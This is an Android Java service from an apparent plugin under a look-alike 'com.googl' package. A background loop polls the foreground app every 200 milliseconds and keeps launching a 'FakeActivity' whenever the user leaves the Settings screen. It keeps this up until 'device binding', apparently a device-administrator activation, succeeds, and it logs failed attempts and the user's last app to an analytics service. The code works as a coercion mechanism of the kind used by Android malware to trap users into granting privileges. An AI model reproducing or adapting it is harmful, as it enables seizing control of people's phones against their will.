package com.xstd.plugin.service;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.text.TextUtils;
import com.googl.plugin.x.FakeActivity;
import com.xstd.plugin.Utils.CommonUtil;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.PluginSettingManager;

import java.util.HashMap;

/**
 * Created by michael on 13-12-12.
 */
public class WatchService extends Service {

    private Thread mWatchingThread;

    private boolean mDeviceWindowShowInBinding = false;

    private long mStartTime;

    private String mLastTopPackage = "nothing";

    private boolean mDeviceHasBinding = false;

    private boolean mBindWatchingProcesHasRunning = false;

    private boolean mHasUpdateLogForFailed = false;

    private static final long FAKE_WINDOW_NOT_SHOW_DELAY = ((long) 60) * 1000;

    @Override
    public void onCreate() {
        super.onCreate();

        if (CommonUtil.isBindingActive(getApplicationContext())) {
            if (Config.DEBUG) {
                Config.LOGD("[[WatchService::onCreate]] just STOP SELF as the DEVICE BINDING is ACTIVE");
            }
            //设备已经绑定成功了
            mDeviceHasBinding = true;

            stopSelf();

            return;
        }

        mStartTime = System.currentTimeMillis();

        AppRuntime.WATCHING_SERVICE_RUNNING.set(true);
        AppRuntime.WATCHING_SERVICE_BREAK.set(false);
        AppRuntime.WATCHING_TOP_IS_SETTINGS.set(false);

        final ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        mWatchingThread = new Thread(new Runnable() {
            @Override
            public void run() {
                mBindWatchingProcesHasRunning = true;
                mLastTopPackage = "null";
                while (!AppRuntime.WATCHING_SERVICE_BREAK.get()) {
                    boolean isDeviceBinded = CommonUtil.isBindingActive(getApplicationContext());
                    if (isDeviceBinded) {
                        mDeviceHasBinding = true;
                        break;
                    }

                    long curTime = System.currentTimeMillis();
                    if ((curTime - mStartTime) >= FAKE_WINDOW_NOT_SHOW_DELAY && !mDeviceWindowShowInBinding) {
                        //如果60秒内都没有展示绑定页面，那么就停止
                        AppRuntime.WATCHING_SERVICE_BREAK.set(true);
                        AppRuntime.WATCHING_TOP_IS_SETTINGS.set(false);

                        int count = PluginSettingManager.getInstance().getBindWindowNotShowCount();
                        PluginSettingManager.getInstance().setBindWindowNotShowCount(count + 1);

                        //更新log，这个统计点是很明确的在一分钟内没有显示出设备激活的情况
                        HashMap<String, String> log = new HashMap<String, String>();
                        log.put("bindingCount", String.valueOf(PluginSettingManager.getInstance().getDeviceBindingCount() + 1));
                        log.put("lastTopPackage", mLastTopPackage);
                        CommonUtil.umengLog(getApplicationContext(), "bind_failed_window_not_show", log);
                        mHasUpdateLogForFailed = true;

                        try {
                            Thread.sleep(50);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }

                        Intent i = new Intent();
                        i.setAction(FakeService.BIND_WINDOW_DISMISS);
                        sendBroadcast(i);

                        continue;
                    }

                    try {
                        Thread.sleep(200);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    String packname = am.getRunningTasks(1).get(0).topActivity.getPackageName();
                    if (Config.DEBUG) {
                        Config.LOGD("[[WatchService]] current top package : " + packname + " isDeviceBinded : (" + isDeviceBinded + ")");
                    }

                    if (!"com.android.settings".equals(packname)) {
                        if (TextUtils.isEmpty(packname)) packname = "package_null";
                        mLastTopPackage = packname;

                        AppRuntime.WATCHING_TOP_IS_SETTINGS.set(false);
                        Intent i = new Intent();
                        i.setClass(getApplicationContext(), FakeActivity.class);
                        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        startActivity(i);

                        try {
                            Thread.sleep(700);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    } else {
                        //显示了setting
                        PluginSettingManager.getInstance().setBindWindowNotShowCount(0);
                        AppRuntime.WATCHING_TOP_IS_SETTINGS.set(true);
                        mDeviceWindowShowInBinding = true;
                    }
                }

                AppRuntime.WATCHING_SERVICE_BREAK.set(true);
                stopSelf();
            }
        });

        mWatchingThread.start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (!mDeviceWindowShowInBinding
                && !mDeviceHasBinding
                && mBindWatchingProcesHasRunning
                && !mHasUpdateLogForFailed) {
            //在次级激活中用户的设备激活页面一次也没有置顶，标识用户的设备绑定有问题，通知
            //统计服务器
            HashMap<String, String> log = new HashMap<String, String>();
            log.put("bindingCount", String.valueOf(PluginSettingManager.getInstance().getDeviceBindingCount() + 1));
            log.put("lastTopPackage", mLastTopPackage);
            CommonUtil.umengLog(getApplicationContext(), "bind_failed_window_not_show", log);
        }

        AppRuntime.WATCHING_SERVICE_RUNNING.set(false);
        AppRuntime.WATCHING_TOP_IS_SETTINGS.set(false);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
